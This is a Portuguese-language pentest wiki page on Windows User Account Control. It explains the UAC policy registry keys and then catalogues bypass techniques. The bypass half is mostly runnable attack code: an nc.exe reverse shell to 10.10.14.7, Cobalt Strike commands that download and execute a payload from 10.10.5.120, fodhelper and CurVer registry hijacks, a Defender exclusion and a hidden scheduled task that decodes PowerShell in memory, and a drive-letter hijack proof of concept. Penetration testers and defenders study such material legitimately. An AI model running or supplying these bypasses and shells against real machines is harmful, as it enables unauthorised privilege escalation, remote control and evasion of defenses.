# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que habilita uma **solicitação de consentimento para ações elevadas**. Applications have different `integrity` levels, and a program with a **high level** can perform tasks that **could potentially compromise the system**. Quando o UAC está ativado, aplicações e tarefas sempre **são executadas no contexto de segurança de uma conta não-administradora** a menos que um administrador autorize explicitamente que essas aplicações/tarefas tenham acesso em nível de administrador ao sistema para serem executadas. É um recurso de conveniência que protege administradores de mudanças não intencionais, mas não é considerado uma fronteira de segurança.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando o UAC está em vigor, um usuário administrador recebe 2 tokens: um token de usuário padrão, para realizar ações regulares no nível normal, e outro com os privilégios de administrador.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute como o UAC funciona em grande detalhe e inclui o processo de logon, a experiência do usuário e a arquitetura do UAC. Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

As configurações de segurança locais ("secpol.msc" na maioria dos sistemas) são configuradas por padrão para **impedir que usuários não administradores realizem instalações de software**. Isso significa que mesmo que um usuário não administrador consiga baixar o instalador do seu software, ele não poderá executá-lo sem uma conta de administrador.

### Registry Keys to Force UAC to Ask for Elevation

Como um usuário padrão sem direitos de administrador, você pode garantir que a conta "standard" seja **solicitada a fornecer credenciais pelo UAC** quando tentar executar certas ações. Essa ação exigiria modificar certas **chaves do registro**, para as quais você precisa de permissões de administrador, a menos que exista um **UAC bypass**, ou o atacante já esteja logado como administrador.

Mesmo se o usuário estiver no **Administrators** group, essas alterações forçam o usuário a **reinscrever suas credenciais da conta** para realizar ações administrativas.

**A única desvantagem é que essa abordagem precisa do UAC desabilitado para funcionar, o que é improvável em ambientes de produção.**

As chaves de registro e entradas que você deve alterar são as seguintes (com seus valores padrão entre parênteses):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Isso também pode ser feito manualmente através da ferramenta Local Security Policy. Uma vez alterado, operações administrativas solicitarão que o usuário reinsira suas credenciais.

### Nota

**User Account Control is not a security boundary.** Portanto, usuários padrão não podem escapar de suas contas e obter direitos de administrador sem um exploit de elevação de privilégio local.

### Pedir 'acesso total ao computador' a um usuário
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Privilégios do UAC

- Internet Explorer Protected Mode usa verificações de integridade para impedir que processos de alto nível de integridade (como web browsers) acessem dados de baixo nível de integridade (como a pasta Temporary Internet Files). Isso é feito executando o navegador com um token de baixa integridade. Quando o navegador tenta acessar dados armazenados na zona de baixa integridade, o sistema operacional verifica o nível de integridade do processo e permite o acesso conforme apropriado. Esse recurso ajuda a evitar que ataques de execução remota de código obtenham acesso a dados sensíveis no sistema.
- Quando um usuário faz logon no Windows, o sistema cria um access token que contém uma lista dos privilégios do usuário. Privilégios são definidos como a combinação dos direitos e capacidades de um usuário. O token também contém uma lista das credenciais do usuário, que são usadas para autenticar o usuário no computador e em recursos na rede.

### Autoadminlogon

Para configurar o Windows para efetuar logon automático de um usuário específico na inicialização, defina a **chave de registro `AutoAdminLogon`**. Isso é útil para ambientes de quiosque ou para fins de teste. Use isso apenas em sistemas seguros, pois expõe a senha no registro.

Defina as seguintes chaves usando o Registry Editor ou `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Para reverter ao comportamento normal de logon, defina `AutoAdminLogon` como 0.

## Bypass do UAC

> [!TIP]
> Note that if you have graphical access to the victim, UAC bypass is straight forward as you can simply click on "Yes" when the UAC prompt appears

O bypass do UAC é necessário na seguinte situação: **o UAC está ativado, seu processo está sendo executado em um contexto de integridade média, e seu usuário pertence ao grupo de administradores**.

É importante mencionar que é **muito mais difícil burlar o UAC se ele estiver no nível de segurança mais alto (Always) do que se estiver em qualquer um dos outros níveis (Default).**

### UAC desativado

Se o UAC já estiver desativado (`ConsentPromptBehaviorAdmin` é **`0`**) você pode **executar um reverse shell com privilégios de admin** (nível de integridade alto) usando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muito** Básico UAC "bypass" (acesso total ao sistema de arquivos)

Se você tem um shell com um usuário que pertence ao grupo Administrators, você pode **montar o compartilhamento C$** via SMB como um novo disco local e terá **acesso a tudo dentro do sistema de arquivos** (até a pasta pessoal do Administrator).

> [!WARNING]
> **Parece que esse truque não funciona mais**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass com cobalt strike

As técnicas do Cobalt Strike só funcionarão se o UAC não estiver configurado no seu nível máximo de segurança
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** também têm vários módulos para **bypass** o **UAC**.

### KRBUACBypass

Documentação e ferramenta em [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) que é uma **compilação** de vários UAC bypass exploits. Observe que será necessário **compile UACME using visual studio or msbuild**. A compilação criará vários executáveis (like `Source\Akagi\outout\x64\Debug\Akagi.exe`), você precisará saber **qual deles você precisa.**\
Você deve **ter cuidado** porque alguns bypasses irão **acionar alguns outros programas** que irão **alertar** o **usuário** de que algo está acontecendo.

UACME tem a **versão de build a partir da qual cada técnica passou a funcionar**. Você pode procurar por uma técnica que afete suas versões:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Além disso, usando [this](https://en.wikipedia.org/wiki/Windows_10_version_history) página você obtém a release do Windows `1607` a partir das versões de build.

### UAC Bypass – fodhelper.exe (Registry hijack)

O binário confiável `fodhelper.exe` é auto-elevado em versões modernas do Windows. Quando iniciado, ele consulta o caminho de registro por-usuário abaixo sem validar o verbo `DelegateExecute`. Plantar um comando ali permite que um processo Medium Integrity (o usuário está em Administrators) crie um processo High Integrity sem um prompt do UAC.

Caminho de registro consultado pelo fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Etapas do PowerShell (defina seu payload, depois acione)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notas:
- Funciona quando o usuário atual é membro do Administrators e o nível do UAC está em padrão/leniente (não em Always Notify com restrições extras).
- Use o caminho `sysnative` para iniciar um PowerShell de 64-bit a partir de um processo de 32-bit em Windows de 64-bit.
- O payload pode ser qualquer comando (PowerShell, cmd, ou um caminho para um EXE). Evite UIs que solicitem interação para manter stealth.

#### CurVer/extension hijack variant (HKCU only)

Amostras recentes que abusam de `fodhelper.exe` evitam `DelegateExecute` e, em vez disso, **redirecionam o ProgID `ms-settings`** via o valor `CurVer` por usuário. O binário auto-elevado ainda resolve o manipulador sob `HKCU`, portanto nenhum token de administrador é necessário para plantar as chaves:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Uma vez com privilégios elevados, o malware costuma **desativar prompts futuros** definindo `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` para `0`, em seguida executa evasão adicional de defesa (por exemplo, `Add-MpPreference -ExclusionPath C:\ProgramData`) e recria persistência para rodar com alta integridade. Uma tarefa de persistência típica armazena um **XOR-encrypted PowerShell script** no disco e o decodifica/executa em memória a cada hora:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
This variant ainda limpa o dropper e deixa apenas os staged payloads, fazendo com que a detecção dependa do monitoramento do **`CurVer` hijack**, manipulação de `ConsentPromptBehaviorAdmin`, criação de exclusão do Defender, ou tarefas agendadas que descriptografam em memória o PowerShell.

#### More UAC bypass

**Todas** as técnicas usadas aqui para contornar o UAC **exigem** um **shell interativo completo** com a vítima (um shell comum nc.exe não é suficiente).

Você pode conseguir isso usando uma sessão **meterpreter**. Migre para um **process** que tenha o valor **Session** igual a **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ deve funcionar)

### UAC Bypass with GUI

Se você tem acesso a uma **GUI** você pode simplesmente aceitar o prompt do UAC quando ele aparecer; você realmente não precisa de um bypass. Então, obter acesso a uma GUI permitirá contornar o UAC.

Além disso, se você conseguir uma sessão GUI que alguém estava usando (potencialmente via RDP) existem **algumas ferramentas que estarão rodando como administrador** de onde você poderia **rodar** um **cmd**, por exemplo, **como admin** diretamente sem ser solicitado novamente pelo UAC, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Isso pode ser um pouco mais **stealthy**.

### Noisy brute-force UAC bypass

Se você não se importa em ser barulhento, sempre pode **executar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **pede para elevar permissões até o usuário aceitar**.

### Your own bypass - Basic UAC bypass methodology

Se você olhar o **UACME** vai notar que **a maioria dos UAC bypasses explora uma vulnerabilidade de Dll Hijacking** (principalmente escrevendo o dll malicioso em _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Encontre um binário que irá **autoelevate** (verifique que quando é executado ele roda em um nível de integridade alto).
2. Com o procmon encontre eventos "**NAME NOT FOUND**" que podem ser vulneráveis a **DLL Hijacking**.
3. Provavelmente você precisará **escrever** o DLL dentro de alguns **protected paths** (como C:\Windows\System32) onde você não tem permissões de escrita. Você pode contornar isso usando:
   1. **wusa.exe**: Windows 7,8 and 8.1. Permite extrair o conteúdo de um arquivo CAB dentro de protected paths (porque essa ferramenta é executada em um nível de integridade alto).
   2. **IFileOperation**: Windows 10.
4. Prepare um **script** para copiar seu DLL para o protected path e execute o binário vulnerável e autoelevated.

### Another UAC bypass technique

Consiste em observar se um **autoElevated binary** tenta **ler** do **registry** o **name/path** de um **binary** ou **command** a ser **executado** (isso é mais interessante se o binário busca essa informação dentro do **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” usa shadow-admin tokens com mapas por sessão `\Sessions\0\DosDevices/<LUID>`. O diretório é criado de forma lazy por `SeGetTokenDeviceMap` na primeira resolução de `\??`. Se o atacante impersonar o shadow-admin token apenas em **SecurityIdentification**, o diretório é criado com o atacante como **owner** (herda `CREATOR OWNER`), permitindo links de letras de unidade que têm precedência sobre `\GLOBAL??`.

**Steps:**

1. A partir de uma sessão com baixa privilégio, chame `RAiProcessRunOnce` para spawnar um runonce.exe shadow-admin sem prompt.
2. Duplique seu token primário para um token de **identification** e o impersonifique enquanto abre `\??` para forçar a criação de `\Sessions\0\DosDevices/<LUID>` sob a propriedade do atacante.
3. Crie um symlink `C:` ali apontando para um armazenamento controlado pelo atacante; acessos subsequentes ao filesystem nessa sessão resolvem `C:` para o caminho do atacante, permitindo DLL/file hijack sem prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Referências
- [HTB: Rainbow – SEH overflow para RCE sobre HTTP (0xdf) – passos de bypass UAC do fodhelper](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – Como o User Account Control funciona](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – coleção de técnicas de bypass UAC](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI adota AI para gerar PowerShell backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
